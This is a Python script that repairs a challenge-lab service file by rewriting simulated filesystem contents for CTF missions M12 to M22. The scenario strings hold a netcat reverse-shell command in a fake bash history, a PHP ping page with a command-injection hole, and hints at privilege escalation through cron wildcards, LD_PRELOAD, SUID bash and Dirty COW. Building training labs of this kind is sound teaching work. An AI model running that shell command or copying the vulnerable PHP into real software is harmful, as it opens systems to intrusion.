import re

with open('app/services/challenge_lab_service.py', 'r') as f:
    text = f.read()

# I want to find a literal newline character that occurs immediately before a double quote
# which in the broken file looks like:
# "line1
# "
# We just replace '\n"' with '\\n"'
# Wait, let's just use regex to replace literal newlines that are inside the values of the dicts.
# A simpler way is to replace '\n",\n' with '\\n",\n'

text = text.replace('\n",\n', '\\n",\n')
text = text.replace('\n    }\n', '\\n"\n    }\n')

# Actually, the easiest way to fix this is to run a simple script that re-inserts it fully.
# The previous string insertion used """ ... """ which preserves newlines. I just need to define code with string concatenation

code = '''
    _M12_FILES: dict[str, str] = {
        "/home/user/notes.txt": "I left the flag in /var/lib/secret/flag.txt\\n",
        "/var/lib/secret/flag.txt": "CTF{chmod_777_is_bad}\\n",
    }
    _M13_FILES: dict[str, str] = {
        "/usr/bin/bash": "ELF binary (suid)\\n",
        "/etc/shadow": "root:$6$xyz...:19000:0:99999:7:::\\n",
        "/root/flag.txt": "CTF{suid_bash_privesc}\\n",
    }
    _M14_FILES: dict[str, str] = {
        "/etc/crontab": "* * * * * root /usr/local/bin/backup.sh *\\n",
        "/usr/local/bin/backup.sh": "tar -czf /var/backups/data.tar.gz /data/*\\n",
        "/data/flag.txt": "CTF{cron_wildcard_injection}\\n",
    }
    _M15_FILES: dict[str, str] = {
        "/etc/shadow": "admin:$1$abc$12345/hashed:19000:0:99999:7:::\\n (Hint: MD5 crypt is weak) \\n \\nCTF{weak_md5_crypt}",
    }
    _M16_FILES: dict[str, str] = {
        "/home/user/.bash_history": "nc -e /bin/bash 10.0.0.5 4444\\n",
        "/tmp/notes.txt": "Reverse shell dropped. Flag: CTF{netcat_traditional_e}\\n",
    }
    _M17_FILES: dict[str, str] = {
        "/var/www/html/ping.php": "<?php system('ping -c 4 ' . $_GET['ip']); ?>\\n",
        "/var/www/html/flag.txt": "CTF{semicolon_command_injection}\\n",
    }
    _M18_FILES: dict[str, str] = {
        "/etc/ld.so.preload": "/tmp/hook.so\\n",
        "/tmp/notes.txt": "Used LD_PRELOAD to get root. Flag: CTF{ld_preload_privesc}\\n",
    }
    _M19_FILES: dict[str, str] = {
        "/proc/version": "Linux version 2.6.22 (gcc version 4.1.2)\\n",
        "/home/user/exploit.c": "// Dirty COW exploit\\n",
        "/root/flag.txt": "CTF{dirty_cow_cve_2016_5195}\\n",
    }
    _M20_FILES: dict[str, str] = {
        "/var/log/auth.log": "Failed password for root from 10.0.0.2 port 22 ssh2\\nFailed password for root from 10.0.0.2 port 22 ssh2\\nAccepted password for root from 10.0.0.2 port 22 ssh2\\n",
        "/root/flag.txt": "CTF{ssh_bruteforce_success}\\n",
    }
    _M21_FILES: dict[str, str] = {
        "/proc/sys/kernel/yama/ptrace_scope": "0\\n",
        "/home/user/notes.txt": "ptrace_scope is 0, we can inject into processes. Flag: CTF{ptrace_scope_bypass}\\n",
    }
    _M22_FILES: dict[str, str] = {
        "/root/nmap_scan.xml": "<nmaprun><host><ports><port protocol='tcp' portid='22'><state state='open'/></port></ports></host></nmaprun>\\n",
        "/root/flag.txt": "CTF{nmap_service_enumeration}\\n",
    }
'''

# We will just rewrite the entire file from scratch, based on a clean version if possible, but we don't have one.
# So I'll just use regex to remove the broken _M12 to _M22
text = re.sub(r'    _M12_FILES: dict\[str, str\] = \{.*', code, text, flags=re.DOTALL)

with open('app/services/challenge_lab_service.py', 'w') as f:
    f.write(text)

